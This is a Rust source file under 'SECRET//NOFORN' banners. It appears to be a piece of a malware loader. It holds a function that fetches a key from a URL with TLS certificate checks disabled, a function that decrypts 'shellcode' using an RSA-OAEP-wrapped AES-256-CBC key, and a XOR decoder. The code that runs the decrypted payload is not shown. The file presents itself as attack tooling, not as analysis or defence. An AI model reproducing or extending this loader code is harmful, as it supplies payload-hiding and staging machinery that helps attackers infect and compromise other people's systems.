/*********************************************************************************
                            --- SECRET//NOFORN ---
**********************************************************************************/

use reqwest::blocking::Client;
use rsa::{RsaPrivateKey, Oaep, sha2::Sha256};
use rsa::pkcs8::DecodePrivateKey;
use aes::Aes256;
use cbc::Decryptor;
use cbc::cipher::{BlockDecryptMut, KeyIvInit};
use block_padding::Pkcs7;

type Aes256Cbc = Decryptor<Aes256>;

pub fn fetch_key(url: &str) -> Result<String, Box<dyn std::error::Error>> {
    let client = Client::builder()
        .danger_accept_invalid_certs(true)
        .build()?;
    let resp = client.get(url).send()?;
    let text = resp.text()?;
    Ok(text)
}

pub fn decrypt_shellcode(encrypted_data: &[u8], pem_key: &str) -> Result<Vec<u8>, Box<dyn std::error::Error>> {
    let private_key = RsaPrivateKey::from_pkcs8_pem(pem_key)?;
    
    // separate key and payload
    if encrypted_data.len() < 256 {
        return Err("Too short".into());
    }
    let (encrypted_secret, ciphertext) = encrypted_data.split_at(256);

    // decrypt key + IV using RSA-OAEP
    let padding = Oaep::new::<Sha256>();
    let secret_data = private_key.decrypt(padding, encrypted_secret)?;

    if secret_data.len() != 48 { // 16 bytes IV + 32 bytes key
        return Err("Invalid data length".into());
    }

    let (iv, key) = secret_data.split_at(16);

    // decrypt shellcode AES-256-CBC
    let decryptor = Aes256Cbc::new(key.into(), iv.into());
    
    // mutable copy of the ciphertext for decryption
    let mut buf = ciphertext.to_vec();
    
    // decrypt in-place using Pkcs7 padding
    let decrypted_len = decryptor.decrypt_padded_mut::<Pkcs7>(&mut buf)
        .map_err(|_| "AES failed")?
        .len();
        
    // truncate to the actual decrypted length
    buf.truncate(decrypted_len);

    Ok(buf)
}

pub fn xor_decrypt(data: &[u8], key: &[u8]) -> Vec<u8> {
    let mut decrypted = Vec::with_capacity(data.len());
    for (i, &byte) in data.iter().enumerate() {
        decrypted.push(byte ^ key[i % key.len()]);
    }
    decrypted
}

/*********************************************************************************
                            --- SECRET//NOFORN ---
**********************************************************************************/